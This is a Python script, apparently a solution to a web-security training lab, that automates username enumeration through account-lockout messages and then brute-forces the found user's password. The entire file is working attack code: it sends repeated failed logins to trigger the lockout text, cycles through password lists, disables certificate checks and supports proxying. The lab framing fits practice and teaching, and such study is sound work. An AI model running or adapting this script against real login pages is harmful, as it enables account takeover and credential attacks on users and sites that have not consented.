"""
  Lab: Username enumeration via account lock

  Steps:
  1. Read username and password lists
  2. Enumerate a valid username
  3. Brute-force this user's password
  4. Access their account page

  Author: N00BCYB0T
"""
import argparse
import time
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

START_TIME = time.time()

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument("-u", "--url", required=True, help="Target URL")
  parser.add_argument("--proxy")
  args = parser.parse_args()

  print(f"{Fore.BLUE} Starting...")
  session = requests.session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False

  print(f"{Fore.RESET}STEP 1: Reading username and password lists")
  usernames = read_list('../usernames.txt')
  passwords = read_list('../passwords.txt')
  print(f"{Fore.GREEN}[+] The lists were successful loaded.")

  print(f"{Fore.RESET}STEP 2: Enumerating username...")
  valid_user = enumerate_username(args.url, usernames, session)
  if valid_user:
    print(f"\n{Fore.GREEN}[+]{Fore.RESET} Username {Fore.YELLOW}{valid_user}{Fore.RESET} found!")
  else:
    print(f"\n{Fore.YELLOW}[!] Valid user not found!{Fore.RESET}")
    exit(1)
  (session, password) = enumerate_password(args.url, valid_user, passwords, session)
  if password:
    print(f"\n{Fore.GREEN}[+]{Fore.RESET} Username {Fore.YELLOW}{valid_user}{Fore.RESET}:{Fore.YELLOW}{password}{Fore.RESET} found!")
    session.get(f"{args.url}/my-account", data={"username":valid_user, "password": password}, allow_redirects=False)
    elapsed_time = int((time.time() - START_TIME))   
    print(f"{Fore.GREEN}[+] Lab finished!{Fore.RESET} Elapsed time: {elapsed_time} seconds.")
  else:
    print(f"\n{Fore.YELLOW}[!] Password not found!{Fore.RESET}")

def read_list(filepath):
  try:
    with open(filepath, 'rt') as file:
      data = file.readlines()
      return data
  except ValueError as e:
    print(f"{Fore.RED}[-] Failed to read file: {filepath}\nErro:{e}")
    exit(1)

def login(url, data, session):
  try:
    response = session.post(f"{url}/login", data, allow_redirects=False)
    # print(f"{Fore.BLUE}[DEGUB]{Fore.RESET} {response.text}")
    return response
  except ValueError as e:
    print(f"{Fore.RED}[-] Failed to login as {data.username}.\n{e}{Fore.RESET}")
    exit(1)

def enumerate_username(url, usernames, session):
  for idx, username in enumerate(usernames):
    username = username.strip()
    print(f"[{idx+1}] Trying: {Fore.YELLOW}{username:<50}{Fore.RESET}", end='\r', flush=True)
    data = {
      "username": username,
      "password": 'test'
    }
    for i in range(5):
      response = login(url, data, session)
      # print(f"response [{i}]: {response.text}")

    if 'You have made too many incorrect login attempts.' in response.text:
      return username
  return None

def enumerate_password(url, valid_user, passwords, session):
  for idx, password in enumerate(passwords):
    password = password.strip()
    print(f"[{idx+1}] Trying: {Fore.YELLOW}{password:<50}{Fore.RESET}", end="\r", flush=True)
    data = {
      "username": valid_user,
      "password": password
    }

    response = login(url, data, session)
    if response.status_code == 200 and 'You have made too many incorrect login attempts.' not in response.text:
      return session, password

if __name__ == "__main__":
  main()